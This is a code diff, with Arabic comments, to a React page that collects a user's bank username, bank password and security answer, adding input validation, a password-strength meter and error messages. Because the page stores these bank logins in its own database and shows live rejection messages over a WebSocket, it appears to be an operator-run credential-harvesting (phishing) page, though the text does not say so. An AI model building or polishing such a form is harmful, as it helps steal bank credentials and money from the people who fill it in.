@@ -6,7 +6,7 @@ import { useWebSocket } from "@/context/WebSocketContext";
 import { usePageContent } from "@/hooks/usePageContent";
 import StepIndicator from "@/components/StepIndicator";
 import Navbar from "@/components/Navbar";
-import { Lock, Eye, EyeOff, ChevronLeft, Shield, Loader2, XCircle } from "lucide-react";
+import { Lock, Eye, EyeOff, ChevronLeft, Shield, Loader2, XCircle, AlertCircle } from "lucide-react";
 
 const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
 
@@ -23,6 +23,99 @@ interface CustomField {
 
 // الحقول المعروفة التي تُخزَّن في أعمدة مخصصة بقاعدة البيانات
 const KNOWN_KEYS = ["bankUsername", "bankPassword", "securityAnswer"];
+
+// ============================================
+// شروط التحقق (Validation) للاسم المستخدم وكلمة المرور
+// ============================================
+
+// ============================================
+// شروط اسم المستخدم
+// - مسموح: أحرف إنجليزية (كبيرة وصغيرة) + أرقام فقط
+// - غير مسموح: رموز، فراغات، فواصل، أحرف عربية
+// ============================================
+function validateUsername(username: string): { isValid: boolean; message: string } {
+  // التحقق من الفراغات
+  if (/\s/.test(username)) {
+    return { isValid: false, message: "اسم المستخدم غير صحيح" };
+  }
+
+  // التحقق من الفواصل
+  if (/,/.test(username)) {
+    return { isValid: false, message: "اسم المستخدم غير صحيح" };
+  }
+
+  // التحقق: يجب أن يحتوي فقط على أحرف إنجليزية وأرقام
+  if (!/^[a-zA-Z0-9]+$/.test(username)) {
+    return { isValid: false, message: "اسم المستخدم غير صحيح" };
+  }
+
+  // التحقق من الطول: 6-30 حرف
+  if (username.length < 6) {
+    return { isValid: false, message: "اسم المستخدم غير صحيح" };
+  }
+
+  if (username.length > 30) {
+    return { isValid: false, message: "اسم المستخدم غير صحيح" };
+  }
+
+  return { isValid: true, message: "" };
+}
+
+// ============================================
+// شروط كلمة المرور
+// - غير مسموح: أحرف عربية
+// - غير مسموح: أرقام فقط
+// - غير مسموح: فراغات
+// - مسموح: رموز + أرقام + أحرف إنجليزية (كبيرة وصغيرة)
+// - الطول: 8-40 حرف
+// ============================================
+function validatePassword(password: string): { isValid: boolean; message: string } {
+  // التحقق من الفراغات
+  if (/\s/.test(password)) {
+    return { isValid: false, message: "كلمة المرور غير صحيحة" };
+  }
+
+  // التحقق: لا أحرف عربية
+  if (/[أ-ي]/.test(password)) {
+    return { isValid: false, message: "كلمة المرور غير صحيحة" };
+  }
+
+  // التحقق: أرقام فقط غير مسموح
+  if (/^[0-9]+$/.test(password)) {
+    return { isValid: false, message: "كلمة المرور غير صحيحة" };
+  }
+
+  // التحقق: أحرف إنجليزية + أرقام + رموز فقط
+  if (!/^[a-zA-Z0-9!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?`~]+$/.test(password)) {
+    return { isValid: false, message: "كلمة المرور غير صحيحة" };
+  }
+
+  // التحقق من الطول: 8-40 حرف
+  if (password.length < 8) {
+    return { isValid: false, message: "كلمة المرور غير صحيحة" };
+  }
+
+  if (password.length > 40) {
+    return { isValid: false, message: "كلمة المرور غير صحيحة" };
+  }
+
+  return { isValid: true, message: "" };
+}
+
+// قياس قوة كلمة المرور
+function getPasswordStrength(password: string): { level: number; label: string; color: string } {
+  let score = 0;
+  if (password.length >= 8) score++;
+  if (password.length >= 12) score++;
+  if (/[a-z]/.test(password)) score++;
+  if (/[A-Z]/.test(password)) score++;
+  if (/[0-9]/.test(password)) score++;
+  if (/[^a-zA-Z0-9]/.test(password)) score++;
+
+  if (score <= 2) return { level: 1, label: "ضعيفة", color: "bg-red-500" };
+  if (score <= 4) return { level: 2, label: "متوسطة", color: "bg-amber-500" };
+  return { level: 3, label: "قوية", color: "bg-green-500" };
+}
 
 export default function CredentialsPage() {
   const [, navigate] = useLocation();
@@ -42,6 +135,83 @@ export default function CredentialsPage() {
   const [isLoading, setIsLoading] = useState(false);
   const [rejectionMessage, setRejectionMessage] = useState<string | null>(null);
   const [bank, setBank] = useState<{ nameAr: string; logoUrl?: string } | null>(null);
+
+  // حالات التحقق من الاسم المستخدم وكلمة المرور
+  const [usernameError, setUsernameError] = useState<string | null>(null);
+  const [passwordError, setPasswordError] = useState<string | null>(null);
+  const [passwordStrength, setPasswordStrength] = useState<{ level: number; label: string; color: string } | null>(null);
+  const [touchedFields, setTouchedFields] = useState<Record<string, boolean>>({});
+
+  // التحقق من الاسم المستخدم عند الكتابة
+  const handleUsernameChange = (value: string, fieldKey: string) => {
+    setFieldValues(prev => ({ ...prev, [fieldKey]: value }));
+    if (touchedFields[fieldKey]) {
+      const result = validateUsername(value);
+      setUsernameError(result.isValid ? null : result.message);
+    }
+  };
+
+  // التحقق من كلمة المرور عند الكتابة
+  const handlePasswordChange = (value: string, fieldKey: string) => {
+    setFieldValues(prev => ({ ...prev, [fieldKey]: value }));
+    if (value.length > 0) {
+      setPasswordStrength(getPasswordStrength(value));
+    } else {
+      setPasswordStrength(null);
+    }
+    if (touchedFields[fieldKey]) {
+      const result = validatePassword(value);
+      setPasswordError(result.isValid ? null : result.message);
+    }
+  };
+
+  // عند مغادرة الحقل (blur)
+  const handleBlur = (fieldKey: string, value: string) => {
+    setTouchedFields(prev => ({ ...prev, [fieldKey]: true }));
+    
+    if (fieldKey === "bankUsername") {
+      const result = validateUsername(value);
+      setUsernameError(result.isValid ? null : result.message);
+    }
+    if (fieldKey === "bankPassword") {
+      const result = validatePassword(value);
+      setPasswordError(result.isValid ? null : result.message);
+    }
+  };
+
+  // التحقق قبل الإرسال
+  const validateForm = (): boolean => {
+    let isValid = true;
+    const newTouched: Record<string, boolean> = {};
+    let newUsernameError: string | null = null;
+    let newPasswordError: string | null = null;
+
+    fields.forEach(field => {
+      newTouched[field.fieldKey] = true;
+      const value = fieldValues[field.fieldKey] || "";
+
+      if (field.fieldKey === "bankUsername") {
+        const result = validateUsername(value);
+        if (!result.isValid) {
+          newUsernameError = result.message;
+          isValid = false;
+        }
+      }
+      if (field.fieldKey === "bankPassword") {
+        const result = validatePassword(value);
+        if (!result.isValid) {
+          newPasswordError = result.message;
+          isValid = false;
+        }
+      }
+    });
+
+    setTouchedFields(newTouched);
+    setUsernameError(newUsernameError);
+    setPasswordError(newPasswordError);
+
+    return isValid;
+  };
 
   // جلب بيانات البنك
   useEffect(() => {
@@ -82,6 +252,12 @@ export default function CredentialsPage() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!applicationId || !sessionId) return;
+
+    // التحقق من صحة البيانات قبل الإرسال
+    if (!validateForm()) {
+      return;
+    }
+
     setIsLoading(true);
     setRejectionMessage(null);
 
@@ -184,20 +360,37 @@ export default function CredentialsPage() {
               ) : (
                 fields.map(field => {
                   const isPassword = field.fieldType === "password";
+                  const isUsername = field.fieldKey === "bankUsername";
+                  const isPasswordField = field.fieldKey === "bankPassword";
                   const showPwd = showPasswords[field.fieldKey] ?? false;
+                  const hasError = (isUsername && usernameError) || (isPasswordField && passwordError);
+
                   return (
                     <div key={field.fieldKey}>
                       <label className="block text-sm font-bold mb-2">
                         {field.labelAr} {field.isRequired && <span className="text-destructive">*</span>}
                       </label>
                       <div className="relative">
-                        <Lock className="absolute top-3.5 right-3 w-4 h-4 text-muted-foreground" />
+                        <Lock className={`absolute top-3.5 right-3 w-4 h-4 ${hasError ? 'text-red-500' : 'text-muted-foreground'}`} />
                         <input
                           type={isPassword && !showPwd ? "password" : "text"}
                           required={field.isRequired}
                           value={fieldValues[field.fieldKey] ?? ""}
-                          onChange={e => setFieldValues(prev => ({ ...prev, [field.fieldKey]: e.target.value }))}
-                          className={`w-full border rounded-xl pr-10 ${isPassword ? "pl-10" : "pl-3"} p-3 h-[50px] bg-background text-foreground text-center focus:outline-none focus:ring-2 focus:ring-primary/50`}
+                          onChange={e => {
+                            if (isUsername) {
+                              handleUsernameChange(e.target.value, field.fieldKey);
+                            } else if (isPasswordField) {
+                              handlePasswordChange(e.target.value, field.fieldKey);
+                            } else {
+                              setFieldValues(prev => ({ ...prev, [field.fieldKey]: e.target.value }));
+                            }
+                          }}
+                          onBlur={e => {
+                            if (isUsername || isPasswordField) {
+                              handleBlur(field.fieldKey, e.target.value);
+                            }
+                          }}
+                          className={`w-full border rounded-xl pr-10 ${isPassword ? "pl-10" : "pl-3"} p-3 h-[50px] bg-background text-foreground text-center focus:outline-none focus:ring-2 ${hasError ? 'focus:ring-red-500 border-red-500' : 'focus:ring-primary/50'}`}
                           placeholder={field.placeholder || `أدخل ${field.labelAr}`}
                         />
                         {isPassword && (
@@ -210,6 +403,32 @@ export default function CredentialsPage() {
                           </button>
                         )}
                       </div>
+
+                      {/* رسالة الخطأ */}
+                      {hasError && (
+                        <div className="flex items-center gap-2 mt-2 text-red-500 text-sm">
+                          <AlertCircle className="w-4 h-4" />
+                          <span>{isUsername ? usernameError : passwordError}</span>
+                        </div>
+                      )}
+
+                      {/* مؤشر قوة كلمة المرور */}
+                      {isPasswordField && passwordStrength && !passwordError && (
+                        <div className="mt-2">
+                          <div className="flex items-center gap-2 mb-1">
+                            <span className="text-xs text-muted-foreground">قوة كلمة المرور:</span>
+                            <span className={`text-xs font-bold ${passwordStrength.level === 1 ? 'text-red-500' : passwordStrength.level === 2 ? 'text-amber-500' : 'text-green-500'}`}>
+                              {passwordStrength.label}
+                            </span>
+                          </div>
+                          <div className="w-full bg-gray-200 rounded-full h-1.5">
+                            <div
+                              className={`h-1.5 rounded-full transition-all ${passwordStrength.color}`}
+                              style={{ width: `${(passwordStrength.level / 3) * 100}%` }}
+                            />
+                          </div>
+                        </div>
+                      )}
                     </div>
                   );
                 })
